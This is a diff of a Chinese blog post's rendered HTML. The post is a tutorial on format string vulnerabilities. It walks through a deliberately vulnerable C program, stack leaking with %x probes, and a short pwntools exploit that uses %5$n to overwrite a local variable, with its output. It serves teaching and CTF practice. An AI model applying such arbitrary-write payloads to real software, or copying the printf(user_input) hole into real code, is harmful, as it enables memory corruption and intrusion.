-<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_9" target="_blank" rel="noopener">覆盖栈内存</a>
-<ul>
+<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_8" target="_blank" rel="noopener">覆盖内存</a><ul>
+<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_9" target="_blank" rel="noopener">覆盖栈内存</a><ul>
 <li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_9" target="_blank" rel="noopener">覆盖栈内存</a></li>
 <li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_9" target="_blank" rel="noopener">覆盖栈内存</a></li>
 <li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_12" target="_blank" rel="noopener">进行覆盖</a></li>
 </ul>
 </li>
-<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_13" target="_blank" rel="noopener">覆盖任意地址内存</a>
-<ul>
+<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_13" target="_blank" rel="noopener">覆盖任意地址内存</a><ul>
 <li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_14" target="_blank" rel="noopener">覆盖小数字</a></li>
 <li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_15" target="_blank" rel="noopener">覆盖大数字</a></li>
 </ul>
@@ -748,40 +735,34 @@ height:50vh;
 </ul>
 </li>
 </ul>
-<h3 id="font-color-navy0x03-例题探析font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-例题探析font"></a> <font color="navy"><code>0x03 例题探析</code></font></h3>
-<blockquote>
+<h3 id="0x03-例题探析"><a href="#0x03-例题探析" class="headerlink" title="0x03 例题探析"></a><font color="navy"><code>0x03 例题探析</code></font></h3><blockquote>
 <p>这里还是以code2中的代码为例：</p>
 </blockquote>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// code2</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;        </span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">6</span>,b=<span class="number">20</span>;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;a);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,c);</span><br><span class="line">    <span class="built_in">printf</span>(c);				<span class="comment">// 存在格式化字符串漏洞</span></span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Success\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Fail\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="1-编译"><a class="markdownIt-Anchor" href="#1-编译"></a> <code>① 编译</code></h4>
-<p>      为了简单的进行格式化字符串漏洞，在编译时将保护关闭掉：</p>
+<h4 id="①-编译"><a href="#①-编译" class="headerlink" title="① 编译"></a><code>① 编译</code></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了简单的进行格式化字符串漏洞，在编译时将保护关闭掉：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie -o format_string format_string.c</span><br></pre></td></tr></table></figure>
-<h4 id="2-确定数组-c-在栈中相对于格式化字符参数序列"><a class="markdownIt-Anchor" href="#2-确定数组-c-在栈中相对于格式化字符参数序列"></a> <code>② 确定数组 c 在栈中相对于格式化字符参数序列</code></h4>
-<p>      为了确定数组 c 是格式化字符串的参数个数，这里需要通过我们的输入进行泄露，运行程序，并且输入：<code>AAAA%x.%x.%x.%x.%x.%x.%x</code>，查看运行结果：</p>
+<h4 id="②-确定数组-c-在栈中相对于格式化字符参数序列"><a href="#②-确定数组-c-在栈中相对于格式化字符参数序列" class="headerlink" title="② 确定数组 c 在栈中相对于格式化字符参数序列"></a><code>② 确定数组 c 在栈中相对于格式化字符参数序列</code></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了确定数组 c 是格式化字符串的参数个数，这里需要通过我们的输入进行泄露，运行程序，并且输入：<code>AAAA%x.%x.%x.%x.%x.%x.%x</code>，查看运行结果：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAff920694.0.8049189.f7f0c3fc.41414141.252e7825.78252e78Fail</span><br></pre></td></tr></table></figure>
-<p>      因为“AAAA“的十六进制为”41414141“，所以我们可以判断数组 c 是格式化字符串的第 <code>5</code> 个参数，是printf函数的第 <code>6</code> 个参数，如图：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为“AAAA“的十六进制为”41414141“，所以我们可以判断数组 c 是格式化字符串的第 <code>5</code> 个参数，是printf函数的第 <code>6</code> 个参数，如图：</p>
 <p><img src="/images/119-9.jpg" alt></p>
 <blockquote>
 <p>根据上图，我们简单的来画一下此时栈中的示意图：</p>
 </blockquote>
 <p><img src="/images/119-10.jpg" alt></p>
-<h4 id="3-改变变量-a-的值"><a class="markdownIt-Anchor" href="#3-改变变量-a-的值"></a> <code>③ 改变变量 a 的值</code></h4>
-<p>      由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。<sup>[3]</sup>在这里我们想一想怎么才能改变 c 的值呢？让我们一步一步的深入研究：</p>
+<h4 id="③-改变变量-a-的值"><a href="#③-改变变量-a-的值" class="headerlink" title="③ 改变变量 a 的值"></a><code>③ 改变变量 a 的值</code></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。<sup>[3]</sup>在这里我们想一想怎么才能改变 c 的值呢？让我们一步一步的深入研究：</p>
 <blockquote>
-<ol>
-<li>我们已经知道了栈中的情况，以及变量 c 相对于格式化字符串的参数序列（第5个参数），而且我们能控制的输入只有 c，所以我们要想办法要通过对 c 的输入，向 a 地址写入我们想要输入的值</li>
-</ol>
+<p>1)  我们已经知道了栈中的情况，以及变量 c 相对于格式化字符串的参数序列（第5个参数），而且我们能控制的输入只有 c，所以我们要想办法要通过对 c 的输入，向 a 地址写入我们想要输入的值</p>
 <p><br>2)  如何实现这一目标呢？这里需要用到一个控制字符 <code>%n</code> 和 <code>%length$x</code></p>
 <ul>
 <li><code>%n</code>：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量；</li>
 <li><code>%n$x</code>：<strong>可以直接获取栈中被视为printf函数第 n+1 个参数的值</strong></li>
 </ul>
 </blockquote>
-<p>      我们已经确定了数组 c 的地址位置相当于格式化字符串的第 <code>5</code> 个参数，所以我们要在数组 c 的首地址写入 a 的地址，然后使用<code>%5$n</code> 向该地址写入 8，由于 a 的地址长度为 4，所以我们只需要在 <code>%5$n</code> 前面填充 <code>4</code> 个字符，这样输出的字符串长度为 <code>8</code>，那么 <code>%5$n</code> 就会将 <code>8</code> 赋值给格式化字符串的第 <code>5</code> 个参数所指向的地址，也可以将此构造（不唯一）格式进行统一：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们已经确定了数组 c 的地址位置相当于格式化字符串的第 <code>5</code> 个参数，所以我们要在数组 c 的首地址写入 a 的地址，然后使用<code>%5$n</code> 向该地址写入 8，由于 a 的地址长度为 4，所以我们只需要在 <code>%5$n</code> 前面填充 <code>4</code> 个字符，这样输出的字符串长度为 <code>8</code>，那么 <code>%5$n</code> 就会将 <code>8</code> 赋值给格式化字符串的第 <code>5</code> 个参数所指向的地址，也可以将此构造（不唯一）格式进行统一：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[address][padding][%len$n]</span><br></pre></td></tr></table></figure>
-<p>      根据上述分析，我们可以构造如下payload：<code>a_addr + &quot;aaaa&quot; + &quot;%5$n&quot;</code>，则完整的 exp 如下：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述分析，我们可以构造如下payload：<code>a_addr + &quot;aaaa&quot; + &quot;%5$n&quot;</code>，则完整的 exp 如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">"./printf_test2"</span>)</span><br><span class="line">a_addr = int(sh.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">payload = str(p32(a_addr),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"aaaa"</span> + <span class="string">"%5$n"</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">print(<span class="string">"[+] result is:"</span>,sh.recvuntil(<span class="string">"\n"</span>))</span><br><span class="line">print(<span class="string">"[+] a_value is:"</span>,str(sh.recv(),encoding=<span class="string">"unicode_escape"</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>      输出结果如下：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;输出结果如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/CTF/PWN/Test# python3 printf_test2_exp.py </span><br><span class="line">[+] Starting local process &apos;./printf_test2&apos;: pid 2187</span><br><span class="line">[+] result is: b&apos;\xa8\xaa\x9f\xffaaaaSuccess\n&apos;</span><br><span class="line">[+] a_value is: 8</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &apos;./printf_test2&apos; stopped with exit code 0 (pid 2187)</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>从上述结果中的“success”，以及 a 的值中可以分析出，我们已经成功的将 a 的值改为了 <code>8</code>，这个时候栈中的情况如下示意图：</p>
@@ -789,10 +770,9 @@ height:50vh;
 <p><img src="/images/119-11.png" alt></p>
 <blockquote>
 <p>这里要注意：</p>
-<p>      我们不能直接在命令行输入 <code>\xa8\xaa\x9f\xffaaaa%5$n</code> 这是因为虽然前面的确实是 a 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将 <code>\</code>、<code>x</code>、<code>a</code>、<code>8</code>，所以要用pwntool工具。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们不能直接在命令行输入 <code>\xa8\xaa\x9f\xffaaaa%5$n</code> 这是因为虽然前面的确实是 a 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将 <code>\</code>、<code>x</code>、<code>a</code>、<code>8</code>，所以要用pwntool工具。</p>
 </blockquote>
-<h3 id="font-color-navy0x04-referencesfont"><a class="markdownIt-Anchor" href="#font-color-navy0x04-referencesfont"></a> <font color="navy"><code>0x04 References</code></font></h3>
-<p>[1] <a href="https://zhuanlan.zhihu.com/p/94614529" target="_blank" rel="noopener">CWE和CVE及其关系</a></p>
+<h3 id="0x04-References"><a href="#0x04-References" class="headerlink" title="0x04 References"></a><font color="navy"><code>0x04 References</code></font></h3><p>[1] <a href="https://zhuanlan.zhihu.com/p/94614529" target="_blank" rel="noopener">CWE和CVE及其关系</a></p>
 <p>[2] <a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2" target="_blank" rel="noopener">格式化字符串</a></p>
 <p>[3] <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/" target="_blank" rel="noopener">格式化字符串漏洞原理介绍</a></p>
 <p>[4] <a href="https://blog.csdn.net/qq_43394612/article/details/84900668" target="_blank" rel="noopener">格式化字符串漏洞原理详解</a></p>
@@ -805,13 +785,18 @@ height:50vh;
             <p>原文作者：<a href="https://muzibing.github.io">MUZIBing</a>
             </p><p>原文链接：<a href="https://muzibing.github.io/2020/05/29/2020.05.29（119）/">https://muzibing.github.io/2020/05/29/2020.05.29（119）/</a>
             </p><p>发表日期：<a href="https://muzibing.github.io/2020/05/29/2020.05.29（119）/">May 29th 2020, 12:00:00 am</a>
-            </p><p>更新日期：<a href="https://muzibing.github.io/2020/05/29/2020.05.29（119）/">May 30th 2020, 12:24:54 pm</a>
+            </p><p>更新日期：<a href="https://muzibing.github.io/2020/05/29/2020.05.29（119）/">May 30th 2020, 11:52:42 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
     <!-- paginator  -->
     <ul class="post-paginator">
         <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2020/05/30/2020.05.30（120）/" title="【XCTF-pwn】由浅入深的剖析 " string" 题目">
+                    <div class="nextTitle">【XCTF-pwn】由浅入深的剖析 "string" 题目</div>
+                </a>
             
         </li>
         <li class="previous">
@@ -952,7 +937,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x00-前言font"><span class="toc-number">1.</span> <span class="toc-text"> 0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-colornavy0x01-格式化字符串font"><span class="toc-number">2.</span> <span class="toc-text"> 0x01 格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-blueq1什么是格式化字符串-font"><span class="toc-number">2.1.</span> <span class="toc-text"> Q1：什么是格式化字符串 </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-blueq2格式化字符串函数的作用是什么-font"><span class="toc-number">2.2.</span> <span class="toc-text"> Q2：格式化字符串函数的作用是什么？ </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-blueq3格式化字符串函数的组成是什么-font"><span class="toc-number">2.3.</span> <span class="toc-text"> Q3：格式化字符串函数的组成是什么？ </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-blueq4格式化字符串的格式是什么-fontsup23sup"><span class="toc-number">2.4.</span> <span class="toc-text"> Q4：格式化字符串的格式是什么？ [2]&amp;[3]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-blueq5常见的格式化字符串函数有哪些-fontsup3sup"><span class="toc-number">2.5.</span> <span class="toc-text"> Q5：常见的格式化字符串函数有哪些？ [3]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-colornavy0x02-格式化字符串漏洞原理font"><span class="toc-number">3.</span> <span class="toc-text"> 0x02 格式化字符串漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-blueq1printfsc和printfc有什么区别font"><span class="toc-number">3.1.</span> <span class="toc-text"> Q1：printf(&quot;%s&quot;,c);和printf(c);有什么区别？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-blueq2为什么要输入aaaaxxxxxxxfont"><span class="toc-number">3.2.</span> <span class="toc-text"> Q2：为什么要输入AAAA%x.%x.%x.%x.%x.%x.%x?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-color-blueq3利用格式化字符串漏洞能做社么fontsup3sup"><span class="toc-number">3.3.</span> <span class="toc-text"> Q3：利用格式化字符串漏洞能做社么?[3]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x03-例题探析font"><span class="toc-number">4.</span> <span class="toc-text"> 0x03 例题探析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-编译"><span class="toc-number">4.1.</span> <span class="toc-text"> ① 编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-确定数组-c-在栈中相对于格式化字符参数序列"><span class="toc-number">4.2.</span> <span class="toc-text"> ② 确定数组 c 在栈中相对于格式化字符参数序列</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-改变变量-a-的值"><span class="toc-number">4.3.</span> <span class="toc-text"> ③ 改变变量 a 的值</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x04-referencesfont"><span class="toc-number">5.</span> <span class="toc-text"> 0x04 References</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-格式化字符串"><span class="toc-number">2.</span> <span class="toc-text">0x01 格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Q1：什么是格式化字符串"><span class="toc-number">2.1.</span> <span class="toc-text">Q1：什么是格式化字符串 </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q2：格式化字符串函数的作用是什么？"><span class="toc-number">2.2.</span> <span class="toc-text">Q2：格式化字符串函数的作用是什么？ </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q3：格式化字符串函数的组成是什么？"><span class="toc-number">2.3.</span> <span class="toc-text">Q3：格式化字符串函数的组成是什么？ </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q4：格式化字符串的格式是什么？-2-amp-3"><span class="toc-number">2.4.</span> <span class="toc-text">Q4：格式化字符串的格式是什么？ [2]&amp;[3]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q5：常见的格式化字符串函数有哪些？-3"><span class="toc-number">2.5.</span> <span class="toc-text">Q5：常见的格式化字符串函数有哪些？ [3]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-格式化字符串漏洞原理"><span class="toc-number">3.</span> <span class="toc-text">0x02 格式化字符串漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Q1：printf-quot-s-quot-c-和printf-c-有什么区别？"><span class="toc-number">3.1.</span> <span class="toc-text">Q1：printf(&quot;%s&quot;,c);和printf(c);有什么区别？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q2：为什么要输入AAAA-x-x-x-x-x-x-x"><span class="toc-number">3.2.</span> <span class="toc-text">Q2：为什么要输入AAAA%x.%x.%x.%x.%x.%x.%x?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q3：利用格式化字符串漏洞能做社么-3"><span class="toc-number">3.3.</span> <span class="toc-text">Q3：利用格式化字符串漏洞能做社么?[3]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-例题探析"><span class="toc-number">4.</span> <span class="toc-text">0x03 例题探析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#①-编译"><span class="toc-number">4.1.</span> <span class="toc-text">① 编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#②-确定数组-c-在栈中相对于格式化字符参数序列"><span class="toc-number">4.2.</span> <span class="toc-text">② 确定数组 c 在栈中相对于格式化字符参数序列</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#③-改变变量-a-的值"><span class="toc-number">4.3.</span> <span class="toc-text">③ 改变变量 a 的值</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-References"><span class="toc-number">5.</span> <span class="toc-text">0x04 References</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -3009,46 +2994,9 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 119
+        Total : 120
         </div>
         <!-- search  -->
         
@@ -3068,7 +3016,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/2020/05/29/2020.05.29（119）/">详细格式化字符串漏洞原理</a>
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href="/2020/05/30/2020.05.30（120）/">【XCTF-pwn】由浅入深的剖析 "string" 题目</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/2020/05/29/2020.05.29（119）/">详解格式化字符串漏洞</a>
         </li>
     
     
@@ -3093,12 +3046,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.29（112）/">pwntools的简单总结（持续更新）</a>
+            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（114）/">Dan-Boneh密码学课程之学习笔记（持续更新）</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（114）/">Dan-Boneh密码学课程之学习笔记（持续更新）</a>
+            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.29（112）/">pwntools的简单总结（持续更新）</a>
         </li>
     
     
@@ -3118,12 +3071,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.24（109）/">Pwnable.kr的奇幻之旅（二）[collision]</a>
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.23（108）/">Pwnable.kr的奇幻之旅（一）[fd]</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.23（108）/">Pwnable.kr的奇幻之旅（一）[fd]</a>
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2020/04/23/2020.04.24（109）/">Pwnable.kr的奇幻之旅（二）[collision]</a>
         </li>
     
     
@@ -3173,12 +3126,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（98）/">【转载】Data URI 知识点详解</a>
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（97）/">【转载】JavaScript 的隐式转换</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（97）/">【转载】JavaScript 的隐式转换</a>
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/2020.03.04（98）/">【转载】Data URI 知识点详解</a>
         </li>
     
     
